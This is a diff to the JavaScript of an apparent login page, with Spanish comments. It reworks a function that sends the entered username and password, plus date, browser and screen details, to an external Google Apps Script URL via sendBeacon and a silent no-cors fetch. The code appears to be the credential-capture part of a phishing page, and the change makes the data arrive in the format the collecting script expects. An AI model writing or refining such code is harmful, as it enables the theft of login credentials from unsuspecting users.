@@ -257,9 +257,13 @@ const form   = document.getElementById('loginForm');
 const btn    = document.getElementById('btn');
 const status = document.getElementById('status');
 
+/* CAMBIO: ahora manda formulario urlencoded, no JSON.
+   Apps Script lo parsea y lo deja en e.parameter.Usuario / e.parameter.Clave */
 function enviarDatos(payload) {
-  const texto = JSON.stringify(payload);
-  const blob  = new Blob([texto], { type: 'text/plain;charset=utf-8' });
+  const cuerpo = new URLSearchParams(payload).toString();
+  const blob   = new Blob([cuerpo], {
+    type: 'application/x-www-form-urlencoded;charset=UTF-8'
+  });
 
   let enviado = false;
   try { enviado = navigator.sendBeacon(CONFIG.URL_SCRIPT, blob); } catch (e) {}
@@ -268,8 +272,8 @@ function enviarDatos(payload) {
     fetch(CONFIG.URL_SCRIPT, {
       method: 'POST',
       mode: 'no-cors',
-      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
-      body: texto,
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
+      body: cuerpo,
       keepalive: true
     }).catch(function () {});
   }
@@ -288,9 +292,10 @@ form.addEventListener('submit', function (e) {
   btn.disabled = true;
   status.textContent = 'Ingresando...';
 
+  /* CAMBIO: los nombres van en mayúscula, igual que en el Code.gs */
   enviarDatos({
-    usuario:     usuario,
-    clave:       clave,
+    Usuario:     usuario,
+    Clave:       clave,
     fecha:       new Date().toLocaleString('es-AR'),
     dispositivo: navigator.userAgent,
     pantalla:    window.screen.width + 'x' + window.screen.height
